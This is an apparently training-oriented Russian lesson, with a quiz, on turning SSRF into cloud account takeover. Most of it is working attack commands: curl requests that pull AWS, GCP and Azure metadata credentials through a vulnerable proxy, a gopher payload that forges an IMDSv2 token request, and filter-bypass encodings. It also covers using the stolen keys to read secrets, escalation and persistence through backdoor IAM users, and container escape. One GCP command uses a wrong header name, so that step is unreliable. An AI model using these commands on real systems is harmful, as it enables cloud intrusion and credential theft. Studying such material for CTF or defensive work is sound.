---
id: web-ssrf-cloud-deep
title: "SSRF в облака: AWS/GCP/Azure metadata и IAM"
category: web
parent: web-ssrf-core
difficulty: hard
order: 2
tags: [ssrf, cloud, aws, gcp, azure, metadata, imds, iam]
prerequisites: [web-ssrf]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест облачных приложений"
estimated_minutes: 45
summary: "Доступ к cloud metadata (IMDSv1/v2, GCP, Azure), кража IAM-токенов и эскалация до захвата аккаунта."
---

В облаке SSRF — это не «почитать внутренний сайт», а **прямой путь к облачным кредам**. Каждая VM имеет endpoint метаданных по `169.254.169.254`, который отдаёт IAM-токены, ключи, user-data, конфигурацию. Украденный токен роли часто позволяет читать бакеты, секреты, иногда админить весь аккаунт. Этот урок — про то, как из SSRF выжать максимум облачного доступа, включая обход IMDSv2 и особенности каждого провайдера.

## Теория: что такое cloud metadata

Endpoint `169.254.169.254` (link-local) доступен только с самой VM/контейнера. Он отдаёт:

- **AWS:** IAM role credentials (`AccessKeyId`, `SecretAccessKey`, `Token`), `user-data` (часто с bootstrap-секретами), instance identity document.
- **GCP:** `metadata.google.internal` (`computeMetadata/v1/`) — service-account access token, project-id, instance attributes.
- **Azure:** `169.254.169.254/metadata/instance` (нужен заголовок `Metadata: true`) — managed identity token, resource info.
- **DigitalOcean/Alibaba/Oracle:** аналогичные endpoints.

Два режима AWS:
- **IMDSv1** — простой GET, SSRF крадёт токен мгновенно.
- **IMDSv2** — сначала `PUT /latest/api/token` с заголовком `X-aws-ec2-metadata-token-ttl-seconds`, затем запросы с `X-aws-ec2-metadata-token`. SSRF по GET его не пройдёт **напрямую**, но бывают обходы (см. ниже).

## Инструменты и endpoints

```bash
# AWS IMDSv1
curl -s "http://target/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE"
curl -s "http://target/fetch?url=http://169.254.169.254/latest/user-data"

# GCP (нужен заголовок Metadata-Flavor: Google — иногда SSRF его добавляет)
curl -s "http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl -s "http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"

# Azure (нужен заголовок Metadata: true)
curl -s "http://target/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

Часто SSRF-ручка не даёт добавить заголовок. Тогда GCP/Azure metadata напрямую недоступны, но AWS IMDSv1 — да. Для GCP обход: `?recursive=true` и `alt=json`, но заголовок всё равно нужен; иногда помогает `http://metadata.google.internal./` или доступ через SSRF в gopher-совместимом клиенте.

## Разобранный пример: SSRF → AWS role → полный захват

Шаг 1. Находим роль:

```bash
curl -s "https://app.example/api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# webapp-prod-role
```

Шаг 2. Забираем креды:

```bash
curl -s "https://app.example/api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-prod-role"
```

Получаем JSON:
```json
{"Code":"Success","AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"..."}
```

Шаг 3. Используем с нашего хоста:

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws s3 ls
aws secretsmanager list-secrets
aws iam list-attached-role-policies --role-name webapp-prod-role
```

Шаг 4. Эскалация. Смотрим политики роли. Частые пути:
- `s3:GetObject` на бакет с конфигами → другие креды.
- `ssm:GetParameter` / `secretsmanager:GetSecretValue` → пароли БД, API-ключи.
- `iam:PassRole` + `lambda:CreateFunction` → RCE в аккаунте.
- `iam:CreateAccessKey` (если есть) → постоянный доступ.

```bash
aws ssm get-parameters-by-path --path /prod --recursive --with-decryption
```

Шаг 5. Постоянный foothold: создаём нового IAM-пользователя/ключ или бэкдор-роль (если права позволяют), либо просто сохраняем токен (живёт до expiration, обычно часы).

## Обход IMDSv2 и фильтров

Если требуется токен (IMDSv2), пробуем:

```
# SSRF, умеющий слать произвольный метод/заголовки (или через gopher)
PUT /latest/api/token  (header X-aws-ec2-metadata-token-ttl-seconds: 21600)
# затем GET с заголовком X-aws-ec2-metadata-token
```

Через `gopher://` можно сформировать сырой HTTP-запрос с методом PUT и нужными заголовками:
```
gopher://169.254.169.254:80/_PUT%20/latest/api/token%20HTTP/1.1%0D%0AHost:%20169.254.169.254%0D%0AX-aws-ec2-metadata-token-ttl-seconds:%2021600%0D%0AContent-Length:%200%0D%0A%0D%0A
```

Другие обходы фильтров:
- `http://169.254.169.254.nip.io/` — DNS-обёртка, если вырезают IP.
- `http://[::ffff:169.254.169.254]/` — IPv6-mapped.
- `http://0xa9fea9fe/` — hex-представление IP.
- Редирект с вашего сервера на metadata endpoint.
- Экранирование через `@`: `http://169.254.169.254@evil.com` (зависит от парсера).

## Другие облачные источники секретов

Metadata — не единственное. Через SSRF во внутренние сервисы добывают:

- **ECS task metadata** `169.254.170.2` — креды task-роли.
- **EKS IRSA** — токен сервис-аккаунта в `/var/run/secrets/...`, плюс `169.254.169.254` может быть отключён в пользу OIDC.
- **Kubernetes API** `https://kubernetes.default.svc` с SA-токеном.
- **Consul/Vault** внутри — токены и секреты.
- **Metadata для Lambda** — переменные окружения с секретами (через внутренний API).

## Частые ошибки

- **Сразу бежать к `169.254.169.254` без подтверждения SSRF.** Сначала OOB-детект.
- **Забыть заголовки GCP/Azure.** Без `Metadata-Flavor`/`Metadata: true` metadata вернёт 403 — нужен gopher или SSRF с управлением заголовками.
- **Не использовать токен с правильным регионом.** AWS STS требует регион; для S3/SSM — свой.
- **Считать `Expiration` далёким.** Токен живёт часы — сохраняйте и работайте быстро.
- **Игнорировать user-data.** Там часто bootstrap-скрипты с паролями, ключами, repo-токенами.
- **Не смотреть политики роли.** Без них непонятно, куда эскалировать.
- **Ломать прод данными.** `aws s3 rm`/`terminate-instances` — destructive; только чтение, если не согласовано.

## Полный разбор: GCP token → доступ к проекту (с выводом)

GCP metadata требует заголовок `Metadata-Flavor: Google`. Если SSRF-ручка позволяет задать заголовки (или есть gopher), цепочка:

```bash
# 1. service accounts
curl -s "https://app.example/api/proxy?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" \
  -H 'X-Metadata-Flavor: Google'
# default/

# 2. access token
curl -s "https://app.example/api/proxy?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# {"access_token":"ya29...","expires_in":3599}

# 3. project / instance
curl -s "https://app.example/api/proxy?url=http://metadata.google.internal/computeMetadata/v1/project/project-id"
# my-project-123456

# 4. используем токен снаружи
TOKEN=ya29...
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN"
# {"scope":"https://www.googleapis.com/auth/cloud-platform",...}

# 5. читаем секреты/бакеты (по scope)
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b?project=my-project-123456"
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://secretmanager.googleapis.com/v1/projects/my-project-123456/secrets"
```

Если заголовок не пробрасывается — GCP metadata напрямую недоступен; ищите ручку с `headers[]`, `gopher://` или внутренний прокси.

## Reference-таблица: metadata endpoints по провайдерам

| Провайдер | Endpoint | Заголовок | Что отдаёт |
|-----------|----------|-----------|-----------|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` | — | креды роли, user-data |
| AWS IMDSv2 | тот же | токен через PUT | то же (защищено) |
| AWS ECS | `http://169.254.170.2/v2/credentials/...` | — | креды task-роли |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | `Metadata-Flavor: Google` | token, project, ssh-keys |
| Azure | `http://169.254.169.254/metadata/instance` | `Metadata: true` | identity, instance |
| Azure token | `.../metadata/identity/oauth2/token?resource=...&api-version=2018-02-01` | `Metadata: true` | managed identity token |
| DigitalOcean | `http://169.254.169.254/metadata/v1.json` | — | всё сразу (JSON) |
| Alibaba | `http://100.100.100.200/latest/meta-data/` | — | креды, user-data |
| Oracle | `http://169.254.169.254/opc/v2/instance/` | `Authorization: Bearer Oracle` | instance, identity |

## Эскалация IAM: PassRole, SSM, Secrets Manager

Имея креды роли, смотрим политики и ищем эскалацию:

```bash
aws iam list-attached-role-policies --role-name webapp-prod-role
aws iam list-role-policies --role-name webapp-prod-role
```

Частые пути эскалации:

- **`ssm:GetParameter(s)`** → `aws ssm get-parameters-by-path --path /prod --recursive --with-decryption` — пароли БД, API-ключи.
- **`secretsmanager:GetSecretValue`** → `aws secretsmanager get-secret-value --secret-id prod/db`.
- **`iam:PassRole` + `lambda:CreateFunction/InvokeFunction`** → выполнение кода в аккаунте.
- **`iam:CreateAccessKey`/`CreateUser`** → постоянный доступ.
- **`ec2:RunInstances` + `iam:PassRole`** → VM с админской ролью.
- **`s3:GetObject`** на бакет с конфигами → другие креды.

```bash
# проверить identity и права
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name <user> 2>/dev/null
aws s3 ls
```

Действуйте **только на чтение**, если не согласовано иное: `terminate-instances`, `delete-*`, `rm` — destructive.

## Что делать дальше / решение

1. **Подтвердить SSRF** (OOB) и проверить `169.254.169.254`.
2. **AWS IMDSv1** → сразу креды роли; **IMDSv2** → искать PUT/gopher.
3. **GCP/Azure** → нужны заголовки; искать ручку с управлением заголовками.
4. **Проверить user-data** на bootstrap-секреты.
5. **Использовать креды** (`sts get-caller-identity`), изучить политики.
6. **Эскалировать** (SSM/Secrets/PassRole) — чтение, не разрушение.
7. **Сохранить артефакт** (токен/креды) и сообщить координатору (critical).

## Kubernetes/EKS и metadata

В контейнерных средах metadata-поверхность шире, чем «одна VM»:

- **EKS IRSA:** вместо metadata используется OIDC-токен сервис-аккаунта в файле `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`. Через SSRF/LFI читаем токен и меняем его на AWS-креды:

```bash
# читаем токен (если SSRF умеет file:// или есть LFI)
curl -s "http://target/fetch?url=file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token"
# обмениваем на креды (снаружи)
aws sts assume-role-with-web-identity --role-arn <ARN> --role-session-name x \
  --web-identity-token <TOKEN>
```

- **Kubernetes API:** `https://kubernetes.default.svc/api/v1/namespaces/default/secrets` с SA-токеном (`/var/run/secrets/kubernetes.io/serviceaccount/token`). Слабый RBAC → чтение секретов → RCE (см. `svc-docker-k8s`).
- **Kubelet:** `http://127.0.0.1:10250/pods` — иногда без auth; даёт список подов и exec.
- **ECS task metadata:** `http://169.254.170.2/v2/credentials/<id>` — креды task-роли.
- **Docker socket:** если SSRF/LFI дотягивается до `/var/run/docker.sock` — создание контейнера = escape.

Проверяйте не только `169.254.169.254`, но и `kubernetes.default.svc`, `127.0.0.1:10250`, `169.254.170.2` — они часто открыты внутри пода.

## Что делать дальше / решение

1. **Подтвердить SSRF** и определить среду (EC2/ECS/EKS/GKE/AKS).
2. **AWS:** IMDSv1 → креды; IMDSv2 → искать PUT/gopher; ECS → task metadata.
3. **EKS:** IRSA-токен из файла → assume-role.
4. **K8s:** SA-токен → API-сервер → секреты → RCE.
5. **user-data** — на bootstrap-секреты.
6. **Эскалация IAM** — SSM/Secrets/PassRole (чтение).
7. **Артефакт:** сохранить токен/креды, сообщить координатору (critical).

## Итог по облачному SSRF

Порядок: подтвердить SSRF → проверить `169.254.169.254` (IMDSv1) → если закрыто, искать PUT/gopher для IMDSv2 → проверить GCP/Azure (нужны заголовки) → забрать креды/токены → изучить политики → эскалировать (SSM/Secrets/PassRole) на чтение. Сохраните артефакт и сразу уведомьте координатора: облачные креды могут быть критичны и имеют срок жизни.

## Приоритеты и безопасность

Наибольшую ценность даёт **AWS IMDSv1** (мгновенные креды роли) и **ECS/EKS** (task/IRSA-токены). GCP/Azure требуют управления заголовками — ищите ручку, которая их пробрасывает. Всегда начинайте с чтения (`sts get-caller-identity`, `list-*`), никогда не удаляйте и не изменяйте ресурсы без согласования: цель должна остаться живой для дальнейшего пивота. Сохраняйте токены как артефакт — они короткоживущие, но часто достаточны для критичного доступа.

## Квиз

```quiz
- question: "Какой IP у cloud metadata endpoint?"
  options:
    - "127.0.0.1"
    - "169.254.169.254"
    - "10.0.0.1"
    - "192.168.0.1"
  answer: 1
  explanation: "Link-local адрес, общий для AWS/GCP/Azure."
- question: "Чем IMDSv2 отличается от IMDSv1?"
  options:
    - "Другим IP"
    - "Требует PUT-запрос для получения токена и заголовок с ним"
    - "Работает только в GCP"
    - "Возвращает HTML"
  answer: 1
  explanation: "IMDSv2 защищает от простого GET-SSRF через сессионный токен."
- question: "Что в первую очередь забирают из AWS metadata?"
  options:
    - "HTML главной"
    - "IAM role credentials (AccessKeyId/SecretAccessKey/Token)"
    - "Список бакетов"
    - "SSH-ключ"
  answer: 1
  explanation: "Временные креды роли — ключ к аккаунту."
- question: "Какой заголовок обязателен для GCP metadata?"
  options:
    - "Metadata: true"
    - "Metadata-Flavor: Google"
    - "X-Forwarded-For"
    - "Authorization: Bearer"
  answer: 1
  explanation: "GCP требует Metadata-Flavor: Google."
- question: "Чем полезна SSRF к user-data?"
  options:
    - "Там часто bootstrap-скрипты с секретами"
    - "Это публичный сайт"
    - "Там лежит пароль root"
    - "Ничем"
  answer: 0
  explanation: "user-data нередко содержит креды и токены деплоя."
```

## Где пригодится

- **CTF (Web):** облачный SSRF → IAM → секреты → флаг.
- **Bug bounty:** metadata SSRF — critical, часто максимальная выплата.
- **Пентест:** pivot из веб-приложения в облачный контроль.
- **Работа (AppSec/Cloud):** обязательный IMDSv2, ограничение egress, least-privilege роли, мониторинг metadata-запросов.
